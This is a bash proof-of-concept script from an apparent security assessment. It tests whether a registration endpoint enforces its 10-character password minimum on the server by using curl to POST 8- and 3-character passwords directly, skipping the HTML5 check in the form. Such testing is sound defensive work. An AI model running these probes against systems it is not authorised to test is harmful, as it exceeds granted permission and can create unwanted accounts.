#!/bin/bash

# POC: Weak Password Validation - Client-Side Only Bypass (v2)
# This script demonstrates that the /accounts/register/step1 endpoint
# accepts passwords shorter than 10 characters via direct HTTP POST requests,
# bypassing the client-side HTML5 minlength="10" validation.

TARGET_URL="${1:-http://localhost:8000}"
ENDPOINT="/accounts/register/step1"
REGISTER_URL="$TARGET_URL/accounts/register"

echo "[*] Weak Password Validation - Client-Side Only Bypass POC"
echo "[*] Target: $TARGET_URL"
echo ""

# First, try to get the registration form to confirm it exists and has the HTML5 minlength attribute
echo "[STEP 1] Attempting to fetch registration form to verify HTML5 validation..."
echo "------"

FORM_RESPONSE=$(curl -s -X GET "$TARGET_URL/accounts/register/" 2>/dev/null)

if echo "$FORM_RESPONSE" | grep -q 'minlength="10"'; then
    echo "[✓] Confirmed: Form contains HTML5 minlength=\"10\" attribute on password field"
    echo "[!] This is client-side only validation that can be bypassed"
elif echo "$FORM_RESPONSE" | grep -q 'type="password"'; then
    echo "[✓] Password field found in registration form"
else
    echo "[-] Could not retrieve registration form, but continuing with bypass test..."
fi

echo ""

# Test 1: Bypass with 8-character password (less than minlength="10")
echo "[STEP 2] Testing bypass with 8-character password (less than minlength)"
echo "------"

TEST_USER="bypass_test_$(date +%s)"
TEST_PASS="pass1234"  # 8 characters, less than 10

BYPASS_RESPONSE=$(curl -s -X POST "$TARGET_URL/accounts/register/step1" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=${TEST_USER}&password=${TEST_PASS}&password_confirm=${TEST_PASS}" \
  -w "\n%{http_code}" 2>/dev/null)

HTTP_CODE=$(echo "$BYPASS_RESPONSE" | tail -n1)
BODY=$(echo "$BYPASS_RESPONSE" | head -n-1)

echo "Request: POST /accounts/register/step1"
echo "Data: username=${TEST_USER}&password=${TEST_PASS}&password_confirm=${TEST_PASS}"
echo "HTTP Status: $HTTP_CODE"
echo ""

# Analyze response
if [ "$HTTP_CODE" == "200" ]; then
    echo "[!] Server returned 200 - Form may have been re-rendered (validation error or success)"
    if echo "$BODY" | grep -qi "error\|password"; then
        echo "[✗] Likely validation error detected"
    else
        echo "[✓] VULNERABILITY: Short password accepted!"
    fi
elif [ "$HTTP_CODE" == "302" ] || [ "$HTTP_CODE" == "301" ]; then
    echo "[✓] VULNERABILITY: Server redirected (HTTP $HTTP_CODE)"
    echo "[!] Indicates form was accepted and user progressed to next step"
    echo "[!] This confirms server-side validation did NOT reject the 8-character password"
elif [ "$HTTP_CODE" == "400" ] || [ "$HTTP_CODE" == "422" ]; then
    echo "[-] Server returned error code $HTTP_CODE - Validation may have been enforced"
else
    echo "[*] Server returned HTTP $HTTP_CODE"
fi

echo ""

# Test 2: Bypass with extremely short password (3 characters)
echo "[STEP 3] Testing bypass with 3-character password (extreme case)"
echo "------"

TEST_USER2="bypass_test2_$(date +%s)"
TEST_PASS2="abc"  # 3 characters

EXTREME_RESPONSE=$(curl -s -X POST "$TARGET_URL/accounts/register/step1" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=${TEST_USER2}&password=${TEST_PASS2}&password_confirm=${TEST_PASS2}" \
  -w "\n%{http_code}" 2>/dev/null)

HTTP_CODE2=$(echo "$EXTREME_RESPONSE" | tail -n1)

echo "Request: POST /accounts/register/step1"
echo "Data: username=${TEST_USER2}&password=${TEST_PASS2}&password_confirm=${TEST_PASS2}"
echo "HTTP Status: $HTTP_CODE2"
echo ""

if [ "$HTTP_CODE2" == "302" ] || [ "$HTTP_CODE2" == "301" ]; then
    echo "[✓✓] CRITICAL: Even 3-character password accepted!"
    echo "[✓✓] This confirms complete absence of server-side password length validation"
fi

echo ""
echo "[SUMMARY]"
echo "--------"
echo "If the POC received HTTP 302/301 responses, the vulnerability is CONFIRMED."
echo "Short passwords are accepted by the server despite HTML5 minlength=\"10\" attribute."
echo "This indicates client-side only validation without server-side enforcement."